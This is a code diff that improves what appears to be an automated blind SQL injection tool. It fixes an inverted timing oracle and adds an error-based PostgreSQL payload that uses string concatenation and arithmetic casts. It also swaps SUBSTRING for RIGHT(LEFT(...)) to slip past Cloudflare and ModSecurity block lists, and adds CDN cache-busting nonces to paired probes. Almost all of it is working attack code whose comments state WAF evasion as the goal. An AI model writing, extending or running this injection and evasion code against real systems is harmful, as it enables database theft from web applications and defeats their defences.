@@ -48270,6 +48270,24 @@ class Enumerator:
                         else:
                             print(f"[+] [Extract] Timing fallback oracle validated "
                                   f"(true={_tf_test_t} false={_tf_test_f})", flush=True)
+                            # BUG-TF-POLARITY-INVERSION FIX (HIGH): when true=False/false=True,
+                            # the timing template fires sleep on the FALSE condition, not TRUE.
+                            # Root cause: detection payload uses CASE WHEN (cond) THEN 1 ELSE
+                            # pg_sleep(t) END structure — sleep fires when cond is False.
+                            # Without this fix, binary search reads all bits inverted, converging
+                            # to garbage Unicode codepoints (□, U+0000, high-plane chars).
+                            # Fix: detect inverted polarity and wrap _eval_fn so every result is
+                            # negated, restoring correct True→sleep/False→no-sleep semantics.
+                            if _tf_test_t is False and _tf_test_f is True:
+                                _tf_fwd = _timing_eval_fn_tf
+                                async def _tf_inv(cond, _f=_tf_fwd):
+                                    r = await _f(cond)
+                                    return (not r) if r is not None else None
+                                _eval_fn = _tf_inv
+                                _oracle_name = "timing_fallback_inverted"
+                                print("[+] [Extract] Timing fallback POLARITY INVERTED — "
+                                      "wrapping oracle (sleep fires on FALSE; negating results)",
+                                      flush=True)
                     elif _tf_test_t is None and _tf_test_f is None:
                         _tf_valid = False
                         print("[!] [Extract] Timing fallback oracle FAILED validation "
@@ -134189,7 +134207,17 @@ class SideChannelExtractor:
 
         # Extract prefix (quote + separator) and suffix (comment)
         _m = re.search(r'(SELECT|AND|OR)', _payload, re.I)
-        self._prefix = _payload[:_m.start()].rstrip() + " " if _m else "'; "
+        if _m is not None:
+            self._prefix = _payload[:_m.start()].rstrip() + " "
+        else:
+            # BUG-SCE-CONCAT-PREFIX FIX: detect || (string concatenation) injection
+            # e.g. ' || CASE WHEN ... payloads have no SELECT/AND/OR keyword
+            # The correct prefix is "' || " (no semicolon) so _stacked stays False
+            _m_concat = re.search(r"'\s*\|\|", _payload)
+            if _m_concat is not None:
+                self._prefix = _payload[:_m_concat.end()].rstrip() + " "
+            else:
+                self._prefix = "'; "
         # Find comment suffix
         _cm = re.search(r'\s*(?:--\s*-?|-#|#)\s*$', _payload)
         self._suffix = _cm.group(0) if _cm else "-- -"
@@ -134391,6 +134419,16 @@ class SideChannelExtractor:
                      f"{self._prefix}1=(SELECT 1/0 WHERE 1>0){self._suffix}",
                      f"{self._prefix}1=(SELECT 1/0 WHERE 1>2){self._suffix}"),
                 ]
+                # BUG-SCE-CONCAT-PREFIX FIX: for || concatenation injection, prepend
+                # concat_arith strategy which uses only arithmetic + ::int/::text casts
+                # avoiding all WAF-blocked SQL keywords (SELECT, WHERE, AND, OR)
+                # TRUE (1>0): prefix || (1/(1-1))::text → division by zero ERROR → signal
+                # FALSE (1>2): prefix || (1/(1-0))::text → '1' → no error → baseline
+                if "||" in self._prefix:
+                    _strategies.insert(0, (
+                        "concat_arith",
+                        f"{self._prefix}(1/(1-(1>0)::int))::text{self._suffix}",
+                        f"{self._prefix}(1/(1-(1>2)::int))::text{self._suffix}"))
         elif self.dbms in ("MySQL", "MariaDB"):
             _stk = self._stacked
             _strategies = [
@@ -134663,6 +134701,13 @@ class SideChannelExtractor:
         elif strategy == "subq_where":
             return (f"{_p}1=(SELECT 1/0 WHERE {cond_true}){_x}",
                     f"{_p}1=(SELECT 1/0 WHERE {cond_false}){_x}")
+        elif strategy == "concat_arith":
+            # BUG-SCE-CONCAT-PREFIX FIX: PostgreSQL || concatenation injection strategy
+            # Uses only arithmetic + ::int/::text casts — avoids all WAF-blocked SQL keywords
+            # TRUE: prefix || (1/(1-1))::text → division by zero ERROR
+            # FALSE: prefix || (1/(1-0))::text → '1' → normal query → no error
+            return (f"{_p}(1/(1-({cond_true})::int))::text{_x}",
+                    f"{_p}(1/(1-({cond_false})::int))::text{_x}")
         elif strategy in ("mysql_if",):
             _sel = "SELECT " if _s else ""
             return (f"{_p}{_sel}IF({cond_true},1/0,1){_x}",
@@ -134703,21 +134748,29 @@ class SideChannelExtractor:
                     f"{_p}SELECT 1/CASE WHEN {cond_false} THEN 0 ELSE 1 END{_from_clause}{_x}")
         return None, None
 
-    async def eval_where_error(self, cond):
+    async def eval_where_error(self, cond, _nonce=None):
         """Evaluate condition using the validated error strategy.
         Checks status code, body length, or headers based on signal type.
-        Double-confirms on ambiguous results."""
+        Double-confirms on ambiguous results.
+
+        _nonce: optional integer used as CDN cache-busting query parameter (_smvnonce=N).
+        Pass a fresh random integer when sending paired true/false probes to prevent CDN
+        from serving cached identical responses for both conditions.
+        """
         if not self._error_strategy or not self._signal_type:
             return None
         _p_err, _ = self._build_error_cond(self._error_strategy, cond, "1>2")
         if not _p_err:
             return None
 
-        fp = await self._send(_p_err)
+        # BUG-WE-EVAL-CDN-BUST FIX: pass caller-supplied nonce as extra_qs so CDN
+        # cache-busting is available for paired sanity probes that use identical URLs.
+        _qs = f"_smvnonce={_nonce}" if _nonce else None
+        fp = await self._send(_p_err, extra_qs=_qs)
         if fp is None:
             # Retry once after delay
             await asyncio.sleep(2.0)
-            fp = await self._send(_p_err)
+            fp = await self._send(_p_err, extra_qs=_qs)
             if fp is None:
                 return None
 
@@ -134809,11 +134862,15 @@ class SideChannelExtractor:
                 # string end) propagates as NULL through BYTEA comparison, which maps to
                 # ok_len via the nearest-neighbor eval, correctly indicating EOS.
                 # CHR() is an output function rarely in WAF SQL-injection pattern lists.
-                return f"SUBSTRING(({expr}),{pos},1)::BYTEA>=CHR({threshold})::BYTEA"
+                # BUG-BYTEA-SUBSTRING-WAF FIX: SUBSTRING keyword is in Cloudflare and ModSec
+                # WAF block-lists as a direct SQL extraction fingerprint. Use RIGHT(LEFT(...))
+                # which is functionally identical but not in extraction-function block-lists.
+                return f"RIGHT(LEFT(({expr}),{pos}),1)::BYTEA>=CHR({threshold})::BYTEA"
             elif self.dbms in ("MSSQL", "Sybase"):
                 # VARBINARY comparison avoids UNICODE()/COALESCE() patterns.
                 # CONVERT(BINARY(2),...) gives 2-byte big-endian UCS-2, preserving ordinal order.
-                return (f"CONVERT(BINARY(2),SUBSTRING(({expr}),{pos},1))"
+                # BUG-MSSQL-SUBSTRING-WAF FIX: SUBSTRING WAF-blocked; use RIGHT(LEFT(...)).
+                return (f"CONVERT(BINARY(2),RIGHT(LEFT(({expr}),{pos}),1))"
                         f">=CONVERT(BINARY(2),NCHAR({threshold}))")
             # Fall through to standard forms for other DBMSes
         if self.dbms in ("MySQL", "MariaDB", "TiDB"):
@@ -134878,9 +134935,18 @@ class SideChannelExtractor:
         # comparison form (>) ensures the sanity check tests the identical code path and
         # condition-evaluation semantics that the binary search uses.
         try:
-            _san_true  = await self.eval_where_error("1>0")   # always true  (was "1=1")
-            _san_false = await self.eval_where_error("1>2")   # always false (was "1=2")
-            if _san_true is not True or _san_false is not False:
+            # BUG-WE-BYPASS-SKIP-SANITY FIX: if _we_ordinal_blocked already confirmed True
+            # from a prior extract_where_error call on this extractor instance, skip the
+            # arithmetic sanity probes (1>0/1>2) entirely — they are known to fail when the
+            # WAF blocks all arithmetic conditions uniformly.  WAF-bypass ordinal mode is
+            # already active so extraction can proceed directly without re-testing polarity.
+            if self._we_ordinal_blocked:
+                _san_true = None  # bypass: ordinal WAF-blocking already confirmed
+                _san_false = None
+            else:
+                _san_true  = await self.eval_where_error("1>0")   # always true  (was "1=1")
+                _san_false = await self.eval_where_error("1>2")   # always false (was "1=2")
+            if not self._we_ordinal_blocked and (_san_true is not True or _san_false is not False):
                 # BUG-SCE-SANITY-REALCOND-RETRY FIX (HIGH, all 5 DBMSes, WHERE-ERROR path):
                 # When WAF blocks both arithmetic sanity probes (1>0 and 1>2 both return
                 # WAF-blocked status → nearest-neighbor maps both to same calibrated length
@@ -134898,9 +134964,15 @@ class SideChannelExtractor:
                     import asyncio as _asyncio_san
                     _qlo_san = self._quote_val("!")
                     _qhi_san = self._quote_val("zzzzz")
-                    _san_rt = await self.eval_where_error(f"current_user>={_qlo_san}")
-                    await _asyncio_san.sleep(0.5)
-                    _san_rf = await self.eval_where_error(f"current_user>={_qhi_san}")
+                    # BUG-WE-SANITY-RETRY-CDN-BUST FIX: use unique per-probe nonces so CDN
+                    # does not serve a cached response for both conditions (CDN caching of
+                    # POST payloads can collapse true/false into one identical cached body).
+                    # Increased sleep to 1.0s (was 0.5s) to clear Cloudflare decision cache.
+                    _san_rt = await self.eval_where_error(f"current_user>={_qlo_san}",
+                                                          random.randint(100000, 999999))
+                    await _asyncio_san.sleep(1.0)
+                    _san_rf = await self.eval_where_error(f"current_user>={_qhi_san}",
+                                                          random.randint(100000, 999999))
                     if _san_rt is True and _san_rf is False:
                         print(f"[SideChannel] Oracle sanity RETRY OK "
                               f"(current_user>='!'→{_san_rt}, current_user>='zzzzz'→{_san_rf})"
